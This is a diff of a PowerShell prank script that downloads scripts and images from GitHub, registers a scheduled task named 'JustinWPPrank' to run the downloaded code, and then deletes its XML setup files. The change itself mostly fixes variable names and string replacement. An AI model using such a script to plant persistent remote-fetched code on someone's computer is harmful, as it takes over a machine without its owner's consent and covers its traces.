@@ -22,7 +22,7 @@ if(!(Test-Path "$jhPath\imgs")){
 $client = new-object System.Net.WebClient
 $client.DownloadFile("$githubUrl/changer/$changerName", $changerLocalPath)
 $client.DownloadFile("$githubUrl/changer/$changerCallerName", $changerCallerLocalPath)
-$client.DownloadFile("$githubUrl/changer/$taskTemplate", $taskTemplateNamePath)
+$client.DownloadFile("$githubUrl/changer/$taskTemplateName", $taskTemplateNamePath)
 
 # Download images from GitHub
 $imagesDir = "$env:userprofile\jh\imgs"
@@ -32,17 +32,21 @@ foreach($imageName in $imagesName){
 }
 
 # Create XML task file
-$content = Get-Content -Path 'taskSettingsTemplate.xml'
+$content = Get-Content -Path "$jhPath\$taskTemplateName"
 
 # Get current date and time in ISO 8601 format
 $now = Get-Date -Format "yyyy-MM-ddTHH:mm:ss"
 
 # Replace Start Boundary & Command
-$content = $content -replace '$StartBoundary$', $now
-$content = $content -replace '$Command$', $changerCallerLocalPath
+$content = $content.replace('$StartBoundary$', $now)
+$content = $content.replace('$Command$', $changerCallerLocalPath)
 
 # Save as XML file
 $content | Out-File -FilePath "$jhPath\task.xml" -Encoding ASCII
 
 # Use task manager to create a task from xml file
 schtasks /create /xml "$jhPath\task.xml" /tn "JustinWPPrank" /f
+
+# Delete XML files
+Remove-Item -Path "$jhPath\task.xml"
+Remove-Item -Path $taskTemplateNamePath
